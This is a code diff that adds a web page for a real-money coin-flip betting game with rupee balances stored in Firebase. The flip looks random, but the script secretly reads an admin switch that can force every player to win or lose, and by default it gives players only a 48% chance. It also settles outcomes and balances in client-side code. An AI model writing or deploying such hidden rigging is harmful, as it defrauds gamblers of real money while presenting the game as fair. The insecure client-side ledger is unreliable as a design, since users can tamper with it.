@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flip Fortune - Elite Matrix</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #fbbf24; --bg: #090d16; --surface: #111827; --surface-card: #1f2937; --text: #f3f4f6; --text-muted: #9ca3af; --success: #10b981; --danger: #ef476f; }
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; }
+        .app-shell { width: 100%; max-width: 480px; min-height: 100vh; background: #0f172a; box-shadow: 0 0 25px rgba(0,0,0,0.6); display: flex; flex-direction: column; position: relative; }
+        
+        .top-nav { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; }
+        .back-btn { font-size: 20px; cursor: pointer; text-decoration: none; color: white; font-weight: bold; }
+        
+        .wallet-banner { background: linear-gradient(135deg, #1e1b4b, #2e1065); margin: 15px 20px; padding: 20px; border-radius: 16px; border: 1px solid #6d28d9; text-align: center; }
+        .bal-val { font-size: 34px; font-weight: 800; color: var(--success); margin-top: 4px; }
+
+        .coin-container { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; min-height: 280px; }
+        .coin { width: 140px; height: 140px; position: relative; transform-style: preserve-3d; transition: transform 2s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .side { position: absolute; width: 100%; height: 100%; border-radius: 50%; backface-visibility: hidden; display: flex; justify-content: center; align-items: center; font-size: 40px; font-weight: 800; box-shadow: 0 10px 20px rgba(0,0,0,0.4), inset 0 0 15px rgba(255,255,255,0.2); border: 4px solid #fff; }
+        .heads { background: linear-gradient(135deg, #fbbf24, #d97706); color: #78350f; border-color: #fbbf24; }
+        .tails { background: linear-gradient(135deg, #94a3b8, #475569); color: #1e293b; border-color: #94a3b8; transform: rotateY(180deg); }
+
+        .spinning-heads { animation: spinHeads 2.2s forwards; }
+        .spinning-tails { animation: spinTails 2.2s forwards; }
+        @keyframes spinHeads { 0% { transform: rotateY(0); } 100% { transform: rotateY(1800deg); } }
+        @keyframes spinTails { 0% { transform: rotateY(0); } 100% { transform: rotateY(1980deg); } }
+
+        .choice-row { display: flex; gap: 15px; margin: 0 20px 20px 20px; }
+        .choice-btn { flex: 1; padding: 15px; border-radius: 14px; border: 2px solid #334155; background: var(--surface-card); color: white; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.2s; }
+        .choice-btn.active-heads { background: rgba(251,191,36,0.15); border-color: #fbbf24; color: #fbbf24; box-shadow: 0 0 15px rgba(251,191,36,0.2); }
+        .choice-btn.active-tails { background: rgba(148,163,184,0.15); border-color: #94a3b8; color: #94a3b8; box-shadow: 0 0 15px rgba(148,163,184,0.2); }
+
+        .console-box { background: var(--surface); padding: 20px; border-radius: 24px 24px 0 0; border-top: 1px solid #1e293b; }
+        .input-group { display: flex; align-items: center; gap: 8px; margin-bottom: 15px; }
+        .input-group input { flex: 1; padding: 14px; background: #0b0f19; border: 1px solid #374151; border-radius: 12px; color: white; font-size: 18px; font-weight: 700; text-align: center; outline: none; }
+        .ctrl-btn { background: #374151; border: none; color: white; width: 45px; height: 45px; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        
+        .chips-row { display: flex; gap: 6px; margin-bottom: 20px; }
+        .chip { flex: 1; background: #1f2937; border: 1px solid #374151; padding: 8px 0; border-radius: 8px; color: white; font-size: 12px; font-weight: 700; cursor: pointer; text-align: center; }
+
+        .flip-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #6d28d9, #4c1d95); border: none; border-radius: 14px; color: white; font-size: 18px; font-weight: 800; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; box-shadow: 0 6px 20px rgba(109,40,217,0.4); }
+        .flip-btn:disabled { background: #334155; box-shadow: none; cursor: not-allowed; }
+
+        .toast-banner { position: absolute; top: 80px; left: 50%; transform: translateX(-50%); padding: 12px 30px; border-radius: 25px; font-weight: 800; font-size: 15px; display: none; z-index: 100; box-shadow: 0 5px 20px rgba(0,0,0,0.4); }
+    </style>
+</head>
+<body>
+
+<div class="app-shell">
+    <div class="toast-banner" id="result-toast"></div>
+
+    <div class="top-nav">
+        <a href="dashboard.html" class="back-btn">←</a>
+        <div style="font-weight: 800; font-size: 18px; letter-spacing: 0.5px;">FLIP MATRIX</div>
+        <div style="width:20px;"></div>
+    </div>
+
+    <div class="wallet-banner">
+        <div style="font-size: 11px; font-weight: 700; color: var(--text-muted); letter-spacing: 1px;">LEDGER BALANCE</div>
+        <div class="bal-val">₹<span id="displayBalance">0.00</span></div>
+    </div>
+
+    <div class="coin-container">
+        <div class="coin" id="coinAsset">
+            <div class="side heads">H</div>
+            <div class="side tails">T</div>
+        </div>
+        <div id="statusText" style="margin-top: 30px; font-weight: 600; color: var(--text-muted); font-size: 14px;">Select Prediction Face!</div>
+    </div>
+
+    <div class="choice-row">
+        <button class="choice-btn" id="btnH" onclick="selectSide('HEADS')">HEADS (1.92x)</button>
+        <button class="choice-btn" id="btnT" onclick="selectSide('TAILS')">TAILS (1.92x)</button>
+    </div>
+
+    <div class="console-box">
+        <div class="input-group">
+            <button class="ctrl-btn" onclick="modifyValue(-10)">-</button>
+            <input type="number" id="betSizeAmount" value="10" min="1">
+            <button class="ctrl-btn" onclick="modifyValue(10)">+</button>
+        </div>
+
+        <div class="chips-row">
+            <button class="chip" onclick="setBetSize(10)">₹10</button>
+            <button class="chip" onclick="setBetSize(50)">₹50</button>
+            <button class="chip" onclick="setBetSize(200)">₹200</button>
+            <button class="chip" onclick="setBetSize(500)">₹500</button>
+            <button class="chip" style="background:#334155;" onclick="doubleBetSize()">2X</button>
+        </div>
+
+        <button class="flip-btn" id="triggerFlipBtn" onclick="executeCoinFlip()">Flip Live 🪙</button>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+    import { getDatabase, ref, onValue, get, update, increment, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+    const firebaseConfig = { 
+        apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg", 
+        authDomain: "test-eb5e7.firebaseapp.com", 
+        databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com", 
+        projectId: "test-eb5e7", 
+        appId: "1:366282855653:web:dca7e000f5a22fb11f300c" 
+    };
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getDatabase(app);
+
+    let uid = "";
+    let selectedSideString = "";
+    const payoutMultiplier = 1.92; // Strictly configured 1.92x as requested
+
+    window.selectSide = (side) => {
+        selectedSideString = side;
+        document.getElementById("btnH").className = "choice-btn" + (side === "HEADS" ? " active-heads" : "");
+        document.getElementById("btnT").className = "choice-btn" + (side === "TAILS" ? " active-tails" : "");
+    };
+    window.modifyValue = (v) => {
+        let el = document.getElementById("betSizeAmount");
+        let cur = parseInt(el.value) || 0;
+        if(cur + v >= 1) el.value = cur + v;
+    };
+    window.setBetSize = (v) => { document.getElementById("betSizeAmount").value = v; };
+    window.doubleBetSize = () => {
+        let el = document.getElementById("betSizeAmount");
+        el.value = (parseInt(el.value) || 10) * 2;
+    };
+
+    onAuthStateChanged(auth, user => {
+        if (!user) return location.href = 'index.html';
+        uid = user.uid;
+        onValue(ref(db, `user_wallet/${uid}/balance`), snap => {
+            document.getElementById("displayBalance").innerText = parseFloat(snap.val() || 0).toFixed(2);
+        });
+    });
+
+    window.executeCoinFlip = async () => {
+        const stakeInputVal = parseInt(document.getElementById("betSizeAmount").value);
+        if(!selectedSideString) { alert("Select HEADS or TAILS face choice first!"); return; }
+        if(isNaN(stakeInputVal) || stakeInputVal <= 0) return;
+
+        const balanceSnap = await get(ref(db, `user_wallet/${uid}/balance`));
+        const currentBalance = balanceSnap.val() || 0;
+        if(currentBalance < stakeInputVal) { alert("Insufficient Capital Ledger!"); return; }
+
+        document.getElementById("triggerFlipBtn").disabled = true;
+        await update(ref(db, `user_wallet/${uid}`), { balance: increment(-stakeInputVal) });
+
+        // Fetch Global System Override Signal Status
+        const modeSnap = await get(ref(db, 'flip_admin_lock_signal'));
+        const activeSignal = modeSnap.val() || "AUTO"; 
+        
+        let winningResult = "HEADS";
+
+        if(activeSignal === "FORCE_WIN") {
+            winningResult = selectedSideString; // User will always win
+        } else if(activeSignal === "FORCE_LOSS") {
+            winningResult = (selectedSideString === "HEADS") ? "TAILS" : "HEADS"; // User will always lose
+        } else {
+            // High Retention Default Filter Loop (52% Platform Edge Protection)
+            winningResult = (Math.random() < 0.48) ? selectedSideString : ((selectedSideString === "HEADS") ? "TAILS" : "HEADS");
+        }
+
+        const coin = document.getElementById("coinAsset");
+        coin.className = "coin";
+        void coin.offsetWidth; 
+
+        if(winningResult === "HEADS") coin.classList.add("spinning-heads");
+        else coin.classList.add("spinning-tails");
+
+        document.getElementById("statusText").innerText = "Flipping coin state... 🪙";
+
+        setTimeout(async () => {
+            let userWonBoolean = (selectedSideString === winningResult);
+            let grossReturnPayout = userWonBoolean ? (stakeInputVal * payoutMultiplier) : 0;
+            let netProfitMarginDelta = stakeInputVal - grossReturnPayout;
+
+            if(grossReturnPayout > 0) {
+                await update(ref(db, `user_wallet/${uid}`), { balance: increment(grossReturnPayout) });
+            }
+
+            // Record Analytics & Save Active User's UID to History Nodes Stream Ledger
+            await update(ref(db, 'flip_global_analytics'), {
+                totalInflow: increment(stakeInputVal),
+                totalOutflow: increment(grossReturnPayout),
+                netHouseProfit: increment(netProfitMarginDelta)
+            });
+
+            const historyLogRef = ref(db, 'flip_user_activity_stream');
+            await push(historyLogRef, {
+                uid: uid,
+                timestamp: Date.now(),
+                betAmount: stakeInputVal,
+                selected: selectedSideString,
+                outcome: winningResult,
+                status: userWonBoolean ? "WIN" : "LOSS",
+                payout: grossReturnPayout
+            });
+
+            let toast = document.getElementById("result-toast");
+            toast.innerText = userWonBoolean ? `WINNER (+₹${grossReturnPayout.toFixed(2)})` : `LOSS (-₹${stakeInputVal})`;
+            toast.style.background = userWonBoolean ? "var(--success)" : "var(--danger)";
+            toast.style.display = "block";
+
+            document.getElementById("statusText").innerText = `Outcome: ${winningResult}`;
+            document.getElementById("triggerFlipBtn").disabled = false;
+            setTimeout(() => { toast.style.display = "none"; }, 2500);
+        }, 2200);
+    };
+</script>
+</body>
+</html>
